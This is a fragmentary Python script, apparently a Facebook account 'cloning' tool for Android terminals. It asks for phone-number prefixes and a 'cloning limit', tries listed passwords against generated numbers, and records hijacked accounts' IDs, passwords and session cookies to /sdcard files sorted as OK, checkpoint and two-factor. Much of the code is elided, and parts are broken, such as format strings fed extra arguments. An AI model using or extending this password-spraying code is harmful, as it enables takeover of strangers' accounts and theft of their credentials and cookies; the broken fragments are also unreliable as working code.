...
os.system('am start https://www.facebook.com/profile.php?id=100089147156284')
...
try:
    ...
    os.system("xdg-open https://www.facebook.com/profile.php?id=100089147156284")
...
def checks(oks,cps,twf):
    if not len(oks) != 0:
        pass
    if len(cps) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mA B D O-OK.txt' % (
            H, P, str(len(oks))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mA B D O-CP.txt' %
              (H, P, str(len(cps))))
        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97mA B D O-2F.txt' %
              (H, P, str(len(twf))))
...
def cek_apk(session,coki):
    ...
    #____________#
def xyz():
    os.system("play-audio His dust_TO_HAMI_BOOT_818.mp3")
    os.getuid
    os.system("clear");print(logo)
    print('           \x1b[97m[\033[37;41m  A l - M a z d a w i   \033[0;m] ')
    print(f"")
...
def Tabii():
    ...
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  A l - M a z d a w i     \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇❤️‍🩹\033[0;m]")
    print(f"")
    print(' 0306 ,0300 ,0315 ,0333')
    print(f" 0341 ,0342 ,0345 ,0349")
    print(f" 21892 ,21891 ,21894")
    print(f"")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    ...
    print(f"          \x1b[97m[\033[37;41m  A l - M a z d a w i     \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 1000, 2000,3000,4000, 5000, 10000\n\n PUT CLONING LIMIT: '))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[√]---------------------[A l - M a z d a w i  -OK😁🤘🏻]--------------------[√]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                cek_apk(session,coki)
                open('/sdcard/A l - M a z d a w i  -OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[×]--------------------[A l - M a z d a w i  -CP😥😫]---------------------[×]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/A l - M a z d a w i  -CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/A l - M a z d a w i  -2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[A l - M a z d a w i  ] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
